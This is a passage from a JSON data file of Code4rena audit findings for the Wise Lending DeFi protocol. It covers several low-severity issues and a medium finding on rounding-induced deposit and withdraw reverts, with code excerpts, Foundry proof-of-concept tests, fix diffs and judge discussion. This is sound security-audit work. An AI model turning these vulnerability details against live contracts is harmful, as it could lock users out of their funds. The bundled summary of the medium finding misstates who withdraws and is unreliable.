/ overallETH;\n    }\n```\n\nSo borrow APY doesn't account for utilization rate as lending APY. So it shows that you'll have to pay high fees for borrowing, and you'll get proportionally less for providing value to the protocol.\n\nThere is actually yet another function, combining the two above, `overallNetAPY()`, which calculates both lending and borrowing APY, and returns the value combined.\n\nBoth functions are not used by the protocol, but it might false information to either offchain clients or external protocols integrating with `WiseLending`.\n\nAdditional thing to consider is that Pendle markets can be only added; there is no function to remove them.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32111",
      "title": "[05] Adding too much Pendle markets DoSes Pendle `PowerFarm`",
      "impact": "LOW",
      "content": "\nThere is no constraint on how many pendle markets can be added:\n\n```javascript\n    function addPendleMarket(\n        address _pendleMarket,\n        string memory _tokenName,\n        string memory _symbolName,\n        uint16 _maxCardinality\n    )\n        external\n        onlyMaster\n    {\n// [...]\n        activePendleMarkets.push(\n            _pendleMarket\n        );\n// [...]\n```\n\nAdding too much doses syncing supply:\n\n```javascript\n    function syncAllSupply()\n        public\n    {\n        uint256 i;\n        uint256 length = activePendleMarkets.length;\n\n        while (i < length) {\n            _syncSupply(\n                activePendleMarkets[i]\n            );\n            unchecked {\n                ++i;\n            }\n        }\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32110",
      "title": "[04] Opening nonleveraged position in pendle `PowerFarm` is impossible",
      "impact": "LOW",
      "content": "\nIf user wants to have <100% exposure it will revert, in case if 1x leverage flash will be `0` and balancer will revert too.\n\n```solidity\nContract: PendlePowerFarm.sol\n\n185:     function _openPosition(\n186:         bool _isAave,\n187:         uint256 _nftId,\n188:         uint256 _initialAmount,\n189:         uint256 _leverage,\n190:         uint256 _allowedSpread\n191:     )\n192:         internal\n193:     {\n194:         if (_leverage > MAX_LEVERAGE) {\n195:             revert LeverageTooHigh();\n196:         }\n197: \n198:         uint256 leveragedAmount = getLeverageAmount(\n199:             _initialAmount,\n200:             _leverage\n201:         );\n202: \n203:         if (_notBelowMinDepositAmount(leveragedAmount) == false) {\n204:             revert AmountTooSmall();\n205:         }\n206: \n207:         _executeBalancerFlashLoan(\n208:             {\n209:                 _nftId: _nftId,\n210:                 _flashAmount: leveragedAmount - _initialAmount, // @audit if user wants to have <100% exposure it will revert, in case if 1x leverage flash will be 0 and balancer will revert too\n211:                 _initialAmount: _initialAmount,\n212:                 _lendingShares: 0,\n213:                 _borrowShares: 0,\n214:                 _allowedSpread: _allowedSpread,\n215:                 _ethBack: false,\n216:                 _isAave: _isAave\n217:             }\n218:         );\n219:     }\n220: \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32109",
      "title": "[03] No validation of token being removed has shares",
      "impact": "LOW",
      "content": "\nThe manual remove function doesn't validate whether the pool being removed has shares. It can organically have shares during the removal either by TX order or already the share is there.\n\n```solidity\nContract: FeeManager.sol\n\n438:     function removePoolTokenManual(\n439:         address _poolToken\n440:     )\n441:         external\n442:         onlyMaster\n443:     {\n444:         uint256 i;\n445:         uint256 len = getPoolTokenAddressesLength();\n446:         uint256 lastEntry = len - 1;\n447:         bool found;\n448: \n449:         if (poolTokenAdded[_poolToken] == false) {\n450:             revert PoolNotPresent();\n451:         }\n452: \n453:         while (i < len) {\n454: \n455:             if (_poolToken != poolTokenAddresses[i]) {\n456: \n457:                 unchecked {\n458:                     ++i;\n459:                 }\n460: \n461:                 continue;\n462:             }\n463: \n464:             found = true;\n465: \n466:             if (i != lastEntry) {\n467:                 poolTokenAddresses[i] = poolTokenAddresses[lastEntry];\n468:             }\n469: \n470:             break;\n471:         }\n472: \n473:         if (found == true) {\n474: \n475:             poolTokenAddresses.pop();\n476:             poolTokenAdded[_poolToken] = false;\n477: \n478:             emit PoolTokenRemoved(\n479:                 _poolToken,\n480:                 block.timestamp\n481:             );\n482: \n483:             return;\n484:         }\n485: \n486:         revert PoolNotPresent();\n487:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32108",
      "title": "[02] Allowed spread check allows for smaller spread than expected",
      "impact": "LOW",
      "content": "\nAllowed spread check allows for smaller spread than expected, because spread percentage is calculated from value after swaps, not before. \n\n```javascript\n        uint256 ethValueBefore = _getTokensInETH(\n            ENTRY_ASSET,\n            _depositAmount\n        );\n\n        (\n            uint256 receivedShares\n            ,\n        ) = IPendleChild(PENDLE_CHILD).depositExactAmount(\n            netLpOut\n        );\n\n        uint256 ethValueAfter = _getTokensInETH( \n            PENDLE_CHILD,\n            receivedShares\n        )\n            * _allowedSpread // @audit spread is calculated from diminished value\n            / PRECISION_FACTOR_E18;\n\n        if (ethValueAfter < ethValueBefore) {\n            revert TooMuchValueLost();\n        }\n```\n\nSo, the check is actually if `value ETH after * _allowedSpread >= deposit ETH value`. However, the calculation checks if the spread is actually lower than set by user, because the slippage is applied to already diminished value. For example, let's say that user passes the following:\n\n```\ndepositAmount = 100\nallowedSlippage = 105e16 (5%)\n```\n\nSo slippage down to `95` should be accepted. However, due to the flipped calculations, the slippage check would look like `95 * 105% < 100 => 99.75 < 100` and would revert, even though it should be accepted.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32107",
      "title": "[01] Wrong fee amount check doesn't protect against extensive fees",
      "impact": "LOW",
      "content": "\nFunction `PendlePowerFarmToken.depositExactAmount()` checks if position mint fee is not too big by reverting with `TooMuchFee()` error, if `reducedShares == feeShares` evaluates to true. This check is not sufficient, because if `feeShares` are bigger than `reducedShares`, the condition will succeed. Hence, the protection is not sufficient to protect against too big fee.\n\n```javascript\nPendlePowerFarmToken.sol\n    function depositExactAmount(\n//[...]\n        uint256 reducedShares = _applyMintFee(\n            shares\n        );\n\n        uint256 feeShares = shares\n            - reducedShares;\n\n        if (feeShares == 0) {\n            revert ZeroFee();\n        }\n\n        if (reducedShares == feeShares) { // @audit it doesn't concern case when feeShares > reducedShares\n            revert TooMuchFee();\n        }\n```\n\nThe check should be changed to `if (reducedShares <= feeShares)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32106",
      "title": "[M-17] User's attempt to deposit & withdraw reverts due to the calculation style inside `_calculateShares()`",
      "impact": "MEDIUM",
      "content": "\n**Scenario 1:**\n\nThe following flow of events (one among many) causes a revert:\n\n1. Alice calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1 ether`. This executes successfully, as expected.\n2. Bob calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1.5 ether` (or `0.5 ether` or `1 ether` or `2 ether` or any other value). This reverts unexpectedly.\n\nIn case Bob was attempting to make this deposit to rescue his soon-to-become or already bad debt and to avoid liquidation, this revert will delay his attempt which could well be enough for him to be liquidated by any liquidator, causing loss of funds for Bob. Here's a concrete example with numbers:\n\n1. Bob calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1 ether`. This executes successfully, as expected.\n2. Bob calls [`borrowExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L975) to borrow `0.7 ether`. This executes successfully, as expected.\n3. Bob can see that price is soon going to spiral downward and cause a bad debt. He plans to deposit some additional collateral to safeguard himself. He calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) again to deposit `0.5 ether`. This reverts unexpectedly.\n4. Prices go down and he is liquidated.\n\n**Scenario 2:**\n\nA similar revert occurs when the following flow of events occur:\n\n1. Alice calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `10 ether`. This executes successfully, as expected.\n2. Bob calls [`withdrawExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L636) to withdraw `10 ether` (or `10 ether - 1` or `10 ether - 1000` or `9.5 ether` or `9.1 ether`). This reverts unexpectedly.\n\nBob is not able to withdraw his entire deposit. If he leaves behind `1 ether` and withdraws only `9 ether`, then he does not face a revert.\n\nIn both of the above cases, eventually the revert is caused by the validation failure on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) due to the check inside `_validateParameter()`:\n\n```js\n  File: contracts/WiseLending.sol\n\n  210:              function _compareSharePrices(\n  211:                  address _poolToken,\n  212:                  uint256 _lendSharePriceBefore,\n  213:                  uint256 _borrowSharePriceBefore\n  214:              )\n  215:                  private\n  216:                  view\n  217:              {\n  218:                  (\n  219:                      uint256 lendSharePriceAfter,\n  220:                      uint256 borrowSharePriceAfter\n  221:                  ) = _getSharePrice(\n  222:                      _poolToken\n  223:                  );\n  224:\n  225:                  uint256 currentSharePriceMax = _getCurrentSharePriceMax(\n  226:                      _poolToken\n  227:                  );\n  228:\n  229:                  _validateParameter(\n  230:                      _lendSharePriceBefore,\n  231:                      lendSharePriceAfter\n  232:                  );\n  233:\n  234: @--->            _validateParameter(\n  235: @--->                lendSharePriceAfter,\n  236: @--->                currentSharePriceMax\n  237:                  );\n  238:\n  239:                  _validateParameter(\n  240:                      _borrowSharePriceBefore,\n  241:                      currentSharePriceMax\n  242:                  );\n  243:\n  244:                  _validateParameter(\n  245:                      borrowSharePriceAfter,\n  246:                      _borrowSharePriceBefore\n  247:                  );\n  248:              }\n```\n\n### Root Cause\n\n1. [`_compareSharePrices()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L219) is called by [`_syncPoolAfterCodeExecution()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L319) which is executed due to the [`syncPool`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L109) modifier attached to [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L393).\n2. Before `_syncPoolAfterCodeExecution()` in the above step is executed, the following internal calls are made by `depositExactAmountETH()`:\n    - The [`_handleDeposit()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol#L106) function is called on [L407](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L407) which in-turn calls `calculateLendingShares()` on [L115](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L115).\n    - The `calculateLendingShares()` function now calls `_calculateShares()` on [L26](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L26).\n    - [`_calculateShares()` decreases the calculated shares](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) by `1` which is represented by the variable `lendingPoolData[_poolToken].totalDepositShares` inside [`_getSharePrice()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L187).\n    - The `_getSharePrice()` functions uses this `lendingPoolData[_poolToken].totalDepositShares` variable in the denominator on [L185-187](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L185-L187) and in many cases, returns an increased value (in this case it evaluates to `1000000000000000001`) which is captured in the variable `lendSharePriceAfter` inside [`_compareSharePrices()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L219).\n3. Circling back to our first step, this causes the validation to fail on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) inside `_compareSharePrices()` since the `lendSharePriceAfter` is now greater than `currentSharePriceMax` i.e. `1000000000000000001 > 1000000000000000000`. Hence, the transaction reverts.\n\nThe [reduction by 1 inside `_calculateShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) is done by the protocol in its own favour to safeguard itself. The `lendingPoolData[_poolToken].pseudoTotalPool`; however, is never modified. This mismatch eventually reaches a significant divergence, and is the root cause of these reverts.\n\nSee:\n- The last comment inside the `Proof of Concept-2 (Withdraw scenario)` section later in the report.\n- `Option1` inside the `Recommended Mitigation Steps` section later in the report.\n\n<details>\n\n```js\n  File: contracts/WiseLending.sol\n\n  97:               modifier syncPool(\n  98:                   address _poolToken\n  99:               ) {\n  100:                  (\n  101:                      uint256 lendSharePrice,\n  102:                      uint256 borrowSharePrice\n  103:                  ) = _syncPoolBeforeCodeExecution(\n  104:                      _poolToken\n  105:                  );\n  106:          \n  107:                  _;\n  108:          \n  109: @--->            _syncPoolAfterCodeExecution(\n  110:                      _poolToken,\n  111:                      lendSharePrice,\n  112:                      borrowSharePrice\n  113:                  );\n  114:              }\n```\n\n```js\n  File: contracts/WiseLending.sol\n\n  308:              function _syncPoolAfterCodeExecution(\n  309:                  address _poolToken,\n  310:                  uint256 _lendSharePriceBefore,\n  311:                  uint256 _borrowSharePriceBefore\n  312:              )\n  313:                  private\n  314:              {\n  315:                  _newBorrowRate(\n  316:                      _poolToken\n  317:                  );\n  318:          \n  319: @--->            _compareSharePrices(\n  320:                      _poolToken,\n  321:                      _lendSharePriceBefore,\n  322:                      _borrowSharePriceBefore\n  323:                  );\n  324:              }\n```\n\n```js\n  File: contracts/WiseLending.sol\n\n  388:              function depositExactAmountETH(\n  389:                  uint256 _nftId\n  390:              )\n  391:                  external\n  392:                  payable\n  393:                  syncPool(WETH_ADDRESS)\n  394:                  returns (uint256)\n  395:              {\n  396: @--->            return _depositExactAmountETH(\n  397:                      _nftId\n  398:                  );\n  399:              }\n  400:          \n  401:              function _depositExactAmountETH(\n  402:                  uint256 _nftId\n  403:              )\n  404:                  private\n  405:                  returns (uint256)\n  406:              {\n  407: @--->            uint256 shareAmount = _handleDeposit(\n  408:                      msg.sender,\n  409:                      _nftId,\n  410:                      WETH_ADDRESS,\n  411:                      msg.value\n  412:                  );\n  413:          \n  414:                  _wrapETH(\n  415:                      msg.value\n  416:                  );\n  417:          \n  418:                  return shareAmount;\n  419:              }\n```\n\n```js\n  File: contracts/WiseCore.sol\n\n  106:              function _handleDeposit(\n  107:                  address _caller,\n  108:                  uint256 _nftId,\n  109:                  address _poolToken,\n  110:                  uint256 _amount\n  111:              )\n  112:                  internal\n  113:                  returns (uint256)\n  114:              {\n  115: @--->            uint256 shareAmount = calculateLendingShares(\n  116:                      {\n  117:                          _poolToken: _poolToken,\n  118:                          _amount: _amount,\n  119: @--->                    _maxSharePrice: false\n  120:                      }\n  121:                  );\n  122:          \n```\n\n```js\n  File: contracts/MainHelper.sol\n\n  17:               function calculateLendingShares(\n  18:                   address _poolToken,\n  19:                   uint256 _amount,\n  20:                   bool _maxSharePrice\n  21:               )\n  22:                   public\n  23:                   view\n  24:                   returns (uint256)\n  25:               {\n  26:  @--->            return _calculateShares(\n  27:                       lendingPoolData[_poolToken].totalDepositShares * _amount,\n  28:                       lendingPoolData[_poolToken].pseudoTotalPool,\n  29:                       _maxSharePrice\n  30:                   );\n  31:               }\n  32:           \n  33:               function _calculateShares(\n  34:                   uint256 _product,\n  35:                   uint256 _pseudo,\n  36:                   bool _maxSharePrice\n  37:               )\n  38:                   private\n  39:                   pure\n  40:                   returns (uint256)\n  41:               {\n  42:                   return _maxSharePrice == true\n  43:                       ? _product / _pseudo + 1\n  44:  @--->                : _product / _pseudo - 1;\n  45:               }\n```\n\n```js\n  File: contracts/WiseLending.sol\n\n  210:              function _compareSharePrices(\n  211:                  address _poolToken,\n  212:                  uint256 _lendSharePriceBefore,\n  213:                  uint256 _borrowSharePriceBefore\n  214:              )\n  215:                  private\n  216:                  view\n  217:              {\n  218:                  (\n  219: @--->                uint256 lendSharePriceAfter,\n  220:                      uint256 borrowSharePriceAfter\n  221: @--->            ) = _getSharePrice(\n  222:                      _poolToken\n  223:                  );\n  224:          \n  225:                  uint256 currentSharePriceMax = _getCurrentSharePriceMax(\n  226:                      _poolToken\n  227:                  );\n  228:          \n  229:                  _validateParameter(\n  230:                      _lendSharePriceBefore,\n  231:                      lendSharePriceAfter\n  232:                  );\n  233:          \n  234:                  _validateParameter(\n  235: @--->                lendSharePriceAfter,\n  236:                      currentSharePriceMax\n  237:                  );\n  238:          \n  239:                  _validateParameter(\n  240:                      _borrowSharePriceBefore,\n  241:                      currentSharePriceMax\n  242:                  );\n  243:          \n  244:                  _validateParameter(\n  245:                      borrowSharePriceAfter,\n  246:                      _borrowSharePriceBefore\n  247:                  );\n  248:              }\n```\n\n```js\n  File: contracts/WiseLending.sol\n\n  165:              function _getSharePrice(\n  166:                  address _poolToken\n  167:              )\n  168:                  private\n  169:                  view\n  170:                  returns (\n  171:                      uint256,\n  172:                      uint256\n  173:                  )\n  174:              {\n  175:                  uint256 borrowSharePrice = borrowPoolData[_poolToken].pseudoTotalBorrowAmount\n  176:                      * PRECISION_FACTOR_E18\n  177:                      / borrowPoolData[_poolToken].totalBorrowShares;\n  178:          \n  179:                  _validateParameter(\n  180:                      MIN_BORROW_SHARE_PRICE,\n  181:                      borrowSharePrice\n  182:                  );\n  183:          \n  184:                  return (\n  185:                      lendingPoolData[_poolToken].pseudoTotalPool\n  186:                          * PRECISION_FACTOR_E18\n  187: @--->                    / lendingPoolData[_poolToken].totalDepositShares,\n  188:                      borrowSharePrice\n  189:                  );\n  190:              }\n```\n\n</details>\n\n### Proof of Concept \n\n**Deposit scenario:**\n\nAdd the following tests inside `contracts/WisenLendingShutdown.t.sol` and run via `forge test --fork-url mainnet -vvvv --mt test_t0x1c_DepositsRevert` to see the tests fail.\n\n```js\n    function test_t0x1c_DepositsRevert_Simple() \n        public\n    {\n        uint256 nftId;\n        nftId = POSITION_NFTS_INSTANCE.mintPosition(); \n        LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`\n\n        address bob = makeAddr(\"Bob\");\n        vm.deal(bob, 10 ether); // give some ETH to Bob\n        vm.startPrank(bob);\n\n        uint256 nftId_bob = POSITION_NFTS_INSTANCE.mintPosition(); \n        LENDING_INSTANCE.depositExactAmountETH{value: 1.5 ether}(nftId_bob); // @audit : REVERTS incorrectly (reverts for numerous values like `0.5 ether`, `1 ether`, `2 ether`, etc.)\n    }\n\n    function test_t0x1c_DepositsRevert_With_Borrow() \n        public\n    {\n        address bob = makeAddr(\"Bob\");\n        vm.deal(bob, 10 ether); // give some ETH to Bob\n        vm.startPrank(bob);\n\n        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); \n        LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`\n\n        LENDING_INSTANCE.borrowExactAmountETH(nftId, 0.7 ether);\n\n        LENDING_INSTANCE.depositExactAmountETH{value: 0.5 ether}(nftId); // @audit : REVERTS incorrectly; Bob can't deposit additional collateral to save himself\n    }\n```\n\nIf you want to check with values which make the test pass, change the following line in both the tests and run again:\n\n```diff\n-     LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`\n+     LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`\n```\n\nThere are numerous combinations which will cause such a \"revert\" scenario to occur. Just to provide another example:\n\nFour initial deposits are made in either Style1 or Style2:\n\n```\n    - Style1:\n        - Alice makes 4 deposits of `2.5 ether` each. Total deposits made by Alice = 4 /ast 2.5 ether = 10 ether.\n    - Style2:\n        - Alice makes a deposit of `2.5 ether`\n        - Bob makes a deposit of `2.5 ether`\n        - Carol makes a deposit of `2.5 ether`\n        - Dan makes a deposit of `2.5 ether`. Total deposits made by 4 users = 4 /ast 2.5 ether = 10 ether.\n```\n\nNow, Emily tries to make a deposit of `2.5 ether`. This reverts.\n\n**Withdraw scenario:**\n\nAdd the following test inside `contracts/WisenLendingShutdown.t.sol` and run via `forge test --fork-url mainnet -vvvv --mt test_t0x1c_WithdrawRevert` to see the test fail.\n\n```js\n    function test_t0x1c_WithdrawRevert() \n        public\n    {\n        address bob = makeAddr(\"Bob\");\n        vm.deal(bob, 100 ether); // give some ETH to Bob\n        vm.startPrank(bob);\n\n        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); \n        LENDING_INSTANCE.depositExactAmountETH{value: 10 ether}(nftId); \n        \n        LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9.1 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.\n    }\n```\n\nIf you want to check with values which make the test pass, change the following line of the test case like shown below and run again:\n\n```diff\n-     LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9.1 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.\n+     LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.\n```\n\nThis failure happened because the moment `lendingPoolData[_poolToken].pseudoTotalPool` and `lendingPoolData[_poolToken].totalDepositShares` go below `1 ether`, their divergence is significant enough to result in `lendSharePrice` being calculated as greater than `1000000000000000000` or `1 ether`:\n\n```js\n  lendSharePrice = lendingPoolData[_poolToken].pseudoTotalPool * 1e18 / lendingPoolData[_poolToken].totalDepositShares\n```\n\nWhich in this case, evaluates to `1000000000000000001`. This brings us back to our root cause of failure. Due to the divergence, `lendSharePrice` of `1000000000000000001` has become greater than `currentSharePriceMax` of `1000000000000000000` and fails the validation on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) inside `_compareSharePrices()`.\n\nHigh likelihood, as it's possible for a huge number of value combinations, as shown above.\n\nIf user is trying to save his collateral, this is High severity. Otherwise he can try later with modified values making it a Medium severity.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nSince the [reduction by 1 inside `_calculateShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) is being done to round-down in favour of the protocol, removing that without a deeper analysis could prove to be risky as it may open up other attack vectors. Still, two points come to mind which can be explored:\n\n- **Option1:** Reducing `lendingPoolData[_poolToken].pseudoTotalPool` too would keep it in sync with `lendingPoolData[_poolToken].totalDepositShares` and will avoid the current issue.\n\n- **Option2:** Not reducing it by 1 seems to solve the immediate problem at hand (needs further impact analysis):\n\n```diff\n  File: contracts/MainHelper.sol\n\n  33:               function _calculateShares(\n  34:                   uint256 _product,\n  35:                   uint256 _pseudo,\n  36:                   bool _maxSharePrice\n  37:               )\n  38:                   private\n  39:                   pure\n  40:                   returns (uint256)\n  41:               {\n  42:                   return _maxSharePrice == true\n  43:                       ? _product / _pseudo + 1\n- 44:                       : _product / _pseudo - 1;\n+ 44:                       : _product / _pseudo;\n  45:               }\n```\n\n### Assessed type\n\nMath\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2002526153):**\n > If you remove `-1` then it opens other attacks, so it is not justified suggestion. To qualify this for a finding I will let @vonMangoldt give his opinion for these details.\n\n**[Trust (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2021156001):**\n > High quality submission. Likelihood is Low/Med, Impact is Med/High, so Medium is appropriate.\n\n**[t0x1c (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2026692264):**\n> > Likelihood is Low/Med\n> \n> @Trust - Could you please expand on your reasoning behind this? As I mentioned in the report, the frequency/likelihood at which this happens currently is very high which I supported by various random examples.\n>\n> To strengthen my case, here are additional example flows of events which cause a revert for Bob when he tries to save his collateral by depositing additional amount. I have even added more actors so that it can mimic a real world scenario even more closely than before.\n>\n> I am also supplementing Scenario 1 and Scenario 2 (below) of the table with coded PoCs (very similar to the one I already provided in my report), just in case it helps to run it and see the scenario in action. Due to these reasons, I believe the vulnerability should qualify as a `High`. Requesting you to re-assess.\n> \n> | #   | Action1 | Action2 | Action3 | Action4 | Action5 |\n> |:-----:|:-------:|:-------:|:-------:|:-------:|:-------:|\n> | Scenario 1 | Alice deposits 2 ether | Bob deposits 2 ether | Carol deposits 1 ether | Bob borrows 1 ether | Bob deposits 0.5 ether (reverts) |\n> | Scenario 2 | Alice deposits 2 ether | Bob deposits 3 ether | Carol deposits 2.5 ether | Bob borrows 2 ether | Bob deposits 1 ether (reverts) |\n> \n> <details>\n> \n> ```js\n>     function test_t0x1c_MultipleDepositsCombinations_Revert_With_Borrow_Scenario1() \n>         public\n>     {\n>         address alice = makeAddr(\"Alice\");\n>         address bob = makeAddr(\"Bob\");\n>         address carol = makeAddr(\"Carol\");\n>         vm.deal(alice, 10 ether); \n>         vm.deal(bob, 10 ether); \n>         vm.deal(carol, 10 ether); \n> \n>         console.log(\"Action1\");\n>         vm.prank(alice);\n>         uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); \n>         vm.prank(alice);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId); \n> \n>         console.log(\"Action2\");\n>         vm.prank(bob);\n>         uint256 nftId_Bob = POSITION_NFTS_INSTANCE.mintPosition(); \n>         vm.prank(bob);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId_Bob); \n>         \n>         console.log(\"Action3\");\n>         vm.prank(carol);\n>         nftId = POSITION_NFTS_INSTANCE.mintPosition(); \n>         vm.prank(carol);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); \n>         \n>         console.log(\"Action4\");\n>         vm.prank(bob);\n>         LENDING_INSTANCE.borrowExactAmountETH(nftId_Bob, 1 ether);\n> \n>         console.log(\"Action5\");\n>         vm.prank(bob);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 0.5 ether}(nftId_Bob); // @audit : REVERTS incorrectly; Bob can't deposit additional collateral to save himself\n>     }\n> ```\n> \n> and\n> \n> ```js\n>     function test_t0x1c_MultipleDepositsCombinations_Revert_With_Borrow_Scenario2() \n>         public\n>     {\n>         address alice = makeAddr(\"Alice\");\n>         address bob = makeAddr(\"Bob\");\n>         address carol = makeAddr(\"Carol\");\n>         vm.deal(alice, 10 ether); \n>         vm.deal(bob, 20 ether); \n>         vm.deal(carol, 10 ether); \n> \n>         console.log(\"Action1\");\n>         vm.prank(alice);\n>         uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); \n>         vm.prank(alice);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId); \n> \n>         console.log(\"Action2\");\n>         vm.prank(bob);\n>         uint256 nftId_Bob = POSITION_NFTS_INSTANCE.mintPosition(); \n>         vm.prank(bob);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 3 ether}(nftId_Bob); \n>         \n>         console.log(\"Action3\");\n>         vm.prank(carol);\n>         nftId = POSITION_NFTS_INSTANCE.mintPosition(); \n>         vm.prank(carol);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 2.5 ether}(nftId); \n> \n>         console.log(\"Action4\");\n>         vm.prank(bob);\n>         LENDING_INSTANCE.borrowExactAmountETH(nftId_Bob, 2 ether);\n> \n>         console.log(\"Action5\");\n>         vm.prank(bob);\n>         LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId_Bob); // @audit : REVERTS incorrectly; Bob can't deposit additional collateral to save himself\n>     }\n> ```\n> \n> </details>\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2026835367):**\n > There is a huge number of combinations which would cause a revert, but considering the vast space of uint256 that number is actually small. Eventually, the issue is called by a rounding which is off by one, and is easily fixed in a repeat transaction. High would be an overstatement.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2082925714):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThis bug report highlights two scenarios that can cause a transaction to revert unexpectedly while using the WiseLending contract. In the first scenario, if a user named Bob tries to deposit additional collateral to avoid liquidation, the transaction may revert and cause him to lose his funds. This is due to a mismatch in the `lendingPoolData` variable, which is not properly updated by the protocol. Similarly, in the second scenario, if a user named Alice tries to withdraw her entire deposit, the transaction may also revert due to the same issue with the `lendingPoolData` variable. This issue can be easily fixed by updating the protocol to properly update this variable. The team has already implemented a fix for this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27",
